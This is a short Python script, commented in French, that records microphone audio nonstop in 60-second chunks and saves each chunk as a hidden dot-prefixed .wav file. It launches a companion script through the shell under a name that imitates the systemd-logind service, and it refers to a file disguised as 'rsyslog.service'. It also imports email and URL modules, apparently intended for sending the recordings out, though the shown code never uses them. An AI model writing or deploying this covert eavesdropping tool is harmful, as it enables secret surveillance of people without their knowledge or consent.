import pyaudio
import wave
from email.message import EmailMessage
from email.mime import audio
import os
import re
import smtplib
from urllib.request import urlopen
import datetime
import subprocess

#avoir le chemin actuel de travaille
path = os.getcwd()
filename = 'rsyslog.service'
file_path = path+'/'+filename

cmd= ("python3 systemd-logind.service.py")
p = subprocess.Popen( cmd ,stdout =subprocess.PIPE,shell=True)


#Changing the current working directory 
os.chdir(os.path.dirname(os.path.abspath(__file__)))

#initialisation for some necessary variables
CHUNK = 1024
FORMAT = pyaudio.paInt16
CHANNELS = 2
RATE = 44100
k=1
RECORD_SECONDS = 60 #durée de l'enregistrement en secondes
while(1 == 1): # boucle infini
	date = datetime.datetime.now()#avoir la date actuelle
	#nom du fichier à créé 'le point ajouté au début permet de caché le fichier sur linux'
	nom = str(date).replace(" ","-").replace(":","-").split(".")[0] 
	n = str(k) 
	WAVE_OUTPUT_FILENAME = "."+nom + n + ".wav"
	k += 1
	p = pyaudio.PyAudio()# création d'une instance pyaudio
	stream = p.open(format=FORMAT,
	                channels=CHANNELS,
	                rate=RATE,
	                input=True,
	                frames_per_buffer=CHUNK)# création d'un stream
						
	print("* recording")
	frames = []
	#commencer à enregistrer
	for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
	    data = stream.read(CHUNK)
	    frames.append(data)
		
	print("* done recording")
	stream.stop_stream() # arrêter le stream
	stream.close()
	p.terminate()# arrêter pyaudio
   
	wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')# ouvrir WAVE_OUTPUT_FILENAME en mode ecriture seule
	wf.setnchannels(CHANNELS)
	wf.setsampwidth(p.get_sample_size(FORMAT))
	wf.setframerate(RATE)
	wf.writeframes(b''.join(frames))
	wf.close()